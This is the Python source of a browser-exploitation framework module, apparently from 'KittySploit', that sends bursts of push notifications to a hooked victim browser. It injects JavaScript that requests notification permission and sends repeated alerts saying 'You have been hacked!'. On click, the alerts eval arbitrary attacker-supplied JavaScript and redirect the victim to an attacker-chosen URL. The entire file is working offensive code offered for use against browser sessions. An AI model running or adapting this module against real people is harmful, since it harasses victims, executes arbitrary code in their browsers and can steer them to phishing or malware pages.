from kittysploit import *
import time
import json

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Notification Spam",
		"description": "Send multiple push notifications to the browser victim with optional redirect URL or custom JavaScript action on click",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}	

	title = OptString("KittySploit", "Notification title", True)
	message = OptString("You have been hacked!", "Notification message", True)
	icon = OptString("", "Notification icon URL (empty = default)", False)
	count = OptInteger(10, "Number of notifications to send", True)
	delay = OptFloat(0.5, "Delay between notifications in seconds", False)
	request_permission = OptString("true", "Request notification permission if not granted (true/false)", False)
	redirect_url = OptString("", "URL to redirect to when notification is clicked (empty = no redirect)", False)
	onclick_action = OptString("", "JavaScript code to execute when notification is clicked (empty = no action)", False)

	def run(self):
		"""Send multiple push notifications to the target browser"""
		
		# First, request permission if needed
		if self.request_permission.lower() == "true":
			permission_js = """
			(function() {
				if ('Notification' in window) {
					if (Notification.permission === 'default') {
						Notification.requestPermission().then(permission => {
							console.log('Notification permission:', permission);
						});
						return 'requesting';
					} else if (Notification.permission === 'granted') {
						return 'granted';
					} else {
						return 'denied';
					}
				} else {
					return 'not_supported';
				}
			})();
			"""
			
			print_status("Requesting notification permission...")
			permission_result = self.send_js_and_wait_for_response(permission_js, timeout=3.0)
			
			if permission_result:
				if permission_result == 'denied':
					print_warning("Notification permission was denied by the user")
					return False
				elif permission_result == 'not_supported':
					print_error("Notifications are not supported in this browser")
					return False
				elif permission_result == 'requesting':
					print_status("Waiting for user to grant permission...")
					time.sleep(2)  # Wait a bit for user to respond
		
		# Check current permission status
		check_permission_js = """
		(function() {
			if ('Notification' in window) {
				return Notification.permission;
			}
			return 'not_supported';
		})();
		"""
		
		permission_status = self.send_js_and_wait_for_response(check_permission_js, timeout=2.0)
		
		if not permission_status or permission_status == 'denied' or permission_status == 'not_supported':
			if permission_status == 'denied':
				print_error("Notification permission is denied. Cannot send notifications.")
			elif permission_status == 'not_supported':
				print_error("Notifications are not supported in this browser")
			else:
				print_error("Failed to check notification permission")
			return False
		
		if permission_status != 'granted':
			print_warning(f"Notification permission status: {permission_status}")
			print_warning("Attempting to send notifications anyway...")
		
		# Build notification options
		icon_url = self.icon if self.icon else ""
		
		# Send notifications
		print_status(f"Sending {self.count} notification(s)...")
		
		spam_js = f"""
		(function() {{
			const title = {json.dumps(self.title)};
			const message = {json.dumps(self.message)};
			const icon = {json.dumps(icon_url)};
			const count = {self.count};
			const delay = {self.delay} * 1000; // Convert to milliseconds
			
			let sent = 0;
			let failed = 0;
			
			function sendNotification(index) {{
				try {{
					const options = {{
						body: message,
						icon: icon || undefined,
						badge: icon || undefined,
						tag: 'kittysploit_notification_' + index,
						requireInteraction: false,
						silent: false
					}};
					
					const notification = new Notification(title, options);
					
					notification.onclick = function() {{
						window.focus();
						notification.close();
					}};
					
					// Auto-close after 5 seconds
					setTimeout(() => {{
						notification.close();
					}}, 5000);
					
					sent++;
				}} catch (e) {{
					failed++;
					console.error('Failed to send notification:', e);
				}}
			}}
			
			// Send all notifications with delay
			for (let i = 0; i < count; i++) {{
				setTimeout(() => {{
					sendNotification(i);
				}}, i * delay);
			}}
			
			// Return result after all notifications should have been sent
			setTimeout(() => {{
				return {{
					sent: sent,
					failed: failed,
					total: count
				}};
			}}, count * delay + 1000);
			
			return 'Notifications queued';
		}})();
		"""
		
		# Prepare redirect URL and onclick action
		redirect_url_js = json.dumps(self.redirect_url) if self.redirect_url else "null"
		onclick_action_js = json.dumps(self.onclick_action) if self.onclick_action else "null"
		
		# For better control, send notifications one by one with delay
		sent_count = 0
		failed_count = 0
		
		for i in range(self.count):
			single_notification_js = f"""
			(function() {{
				try {{
					const options = {{
						body: {json.dumps(self.message)},
						icon: {json.dumps(icon_url) if icon_url else 'undefined'},
						tag: 'kittysploit_notification_{i}',
						requireInteraction: false
					}};
					
					const notification = new Notification({json.dumps(self.title)}, options);
					
					// Handle click event with redirect and/or custom action
					notification.onclick = function(event) {{
						// Focus the window first
						window.focus();
						
						// Execute custom JavaScript action if provided
						const onclickAction = {onclick_action_js};
						if (onclickAction) {{
							try {{
								eval(onclickAction);
							}} catch (e) {{
								console.error('Error executing onclick action:', e);
							}}
						}}
						
						// Redirect to URL if provided
						const redirectUrl = {redirect_url_js};
						if (redirectUrl) {{
							try {{
								window.location.href = redirectUrl;
							}} catch (e) {{
								console.error('Error redirecting:', e);
								// Fallback: try to open in new tab
								try {{
									window.open(redirectUrl, '_blank');
								}} catch (e2) {{
									console.error('Error opening URL:', e2);
								}}
							}}
						}}
						
						// Close notification
						notification.close();
					}};
					
					// Auto-close after 5 seconds
					setTimeout(() => {{
						notification.close();
					}}, 5000);
					
					return 'sent';
				}} catch (e) {{
					return 'error: ' + e.message;
				}}
			}})();
			"""
			
			result = self.send_js(single_notification_js)
			if result:
				sent_count += 1
				print_success(f"Notification {i+1}/{self.count} sent")
			else:
				failed_count += 1
				print_error(f"Failed to send notification {i+1}/{self.count}")
			
			# Wait before sending next notification
			if i < self.count - 1:  # Don't wait after the last one
				time.sleep(self.delay)
		
		print_info("=" * 80)
		print_success(f"Notification spam completed: {sent_count} sent, {failed_count} failed")
		
		# Display configuration summary
		if self.redirect_url:
			print_info(f"Redirect URL configured: {self.redirect_url}")
		if self.onclick_action:
			print_info(f"Custom onclick action configured: {self.onclick_action[:50]}..." if len(self.onclick_action) > 50 else f"Custom onclick action configured: {self.onclick_action}")
		
		return sent_count > 0
